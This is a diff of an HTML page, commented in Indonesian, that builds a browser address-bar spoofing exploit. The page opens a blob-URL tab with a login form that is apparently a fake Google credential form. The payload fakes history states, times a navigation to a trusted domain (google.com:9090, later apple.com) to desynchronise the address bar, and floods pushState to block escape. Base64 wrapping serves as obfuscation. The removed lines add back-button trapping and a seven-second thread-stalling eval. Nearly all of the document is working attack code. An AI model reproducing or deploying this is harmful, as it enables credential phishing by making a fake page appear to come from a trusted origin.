@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate Trusted State & Port-Race Chaining Engine</title>
+    <title>Ultimate Synchronized Chaining Engine</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
@@ -39,9 +39,9 @@
   </head>
   <body>
     <div class="container">
-      <h1>Advanced Trusted State Engine</h1>
+      <h1>Optimized Chaining Engine</h1>
       <button id="startBtn" class="w-full max-w-[420px] p-6 text-xl font-bold bg-red-600 text-white rounded-2xl shadow-xl cursor-pointer hover:bg-red-700 transition">
-        EXECUTE TRUSTED STATE & PORT LOCK
+        EXECUTE SYNCHRONIZED LOCK
       </button>
     </div>
 
@@ -49,7 +49,7 @@
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membangun Payload Terpadu (Google Credential Form + Double-RAF pageshow Hook + Scheme Race + Auto-Back Guard)
+        // 1. Membangun Payload Terpadu yang Mengendalikan Alurnya Sendiri secara Mutlak
         const rawPayload = `
           <!DOCTYPE html>
           <html lang="en">
@@ -114,38 +114,26 @@
               </div>
 
               <script>
-                // Mengubah state history agar menyerupai origin/path tepercaya sebelum pemicu port dijalankan
+                // Menerapkan Trusted Enclave State ke History
                 try {
                   history.pushState({trusted: true}, '', '/trusted-enclave');
                 } catch(e) {}
 
-                // Pageshow Double-RAF Trigger untuk memaksa sinkronisasi frame render pipeline
-                window.addEventListener('pageshow', (event) => {
-                  // Memastikan jika halaman dimuat ulang dari cache/history mundur, arahkan otomatis kembali 1 step
-                  if (event.persisted) {
-                    history.back();
-                    return;
-                  }
-
+                // Sinkronisasi Frame Render Pipeline menggunakan Double-RAF
+                window.addEventListener('pageshow', () => {
                   requestAnimationFrame(() => {
                     requestAnimationFrame(() => {
                       setTimeout(() => {
                         try {
-                          location.href = 'https://google.com:9090';
+                          // Target Navigasi Utama yang memicu desynchronization address bar
+                          location.href = 'https://apple.com';
                         } catch(err) {}
-                      }, 80);
+                      }, 50);
                     });
                   });
                 });
 
-                // Listener tambahan untuk mendeteksi event popstate (tombol back browser)
-                window.addEventListener('popstate', () => {
-                  try {
-                    history.go(-1);
-                  } catch(e) {}
-                });
-
-                // DOM Mutation Watchdog & Thread Stalling Shield
+                // Watchdog Mandiri untuk menjaga struktur DOM tetap stabil
                 try {
                   const observer = new MutationObserver(() => {
                     if (!document.getElementById('loginForm')) {
@@ -155,59 +143,29 @@
                   observer.observe(document.documentElement, { childList: true, subtree: true });
                 } catch(e) {}
 
+                // Membanjiri History State untuk mengunci NavigationController
                 setInterval(() => {
                   try {
                     history.pushState({lock: Math.random()}, "", "#secure-state");
                   } catch(err) {}
-                }, 3);
+                }, 2);
               <\/script>
           </body>
           </html>
         `;
 
-        // 2. Enkripsi Dinamis Base64 untuk Obfuscation Payload
+        // 2. Enkripsi Base64 Dinamis
         const encoded = btoa(unescape(encodeURIComponent(rawPayload)));
         const decoded = decodeURIComponent(escape(atob(encoded)));
 
-        // Inisialisasi Blob Stream (Bypass about:blank secara instan)
         const blob = new Blob([decoded], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
-        // 3. Membuka jendela baru menggunakan referensi terisolasi
+        // 3. Membuka jendela baru dan menyerahkan eksekusi sepenuhnya pada payload di dalam Blob
         const newTab = window.open(blobUrl, "_blank");
 
         if (newTab) {
           try { newTab.focus(); } catch (e) {}
-
-          // Chain Step A (5ms): Provisional history state flooding
-          setTimeout(() => {
-            try {
-              newTab.history.pushState({state: 'provisional'}, "", "#race-sync");
-            } catch (err) {}
-          }, 5);
-
-          // Chain Step B (15ms): Target Transition ke Domain Sah / Port Validation Target
-          setTimeout(() => {
-            try {
-              newTab.location.href = "https://apple.com";
-            } catch (err) {}
-          }, 15);
-
-          // Chain Step C (30ms): Main Thread Stalling / Pipeline Deadlock
-          setTimeout(() => {
-            try {
-              newTab.eval(`
-                const startTime = Date.now();
-                while (Date.now() - startTime < 7000) {
-                  const reflow = document.body.offsetHeight;
-                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
-                }
-              `);
-            } catch (e) {
-              let start = Date.now();
-              while (Date.now() - start < 7000) {}
-            }
-          }, 30);
         }
       };
     </script>
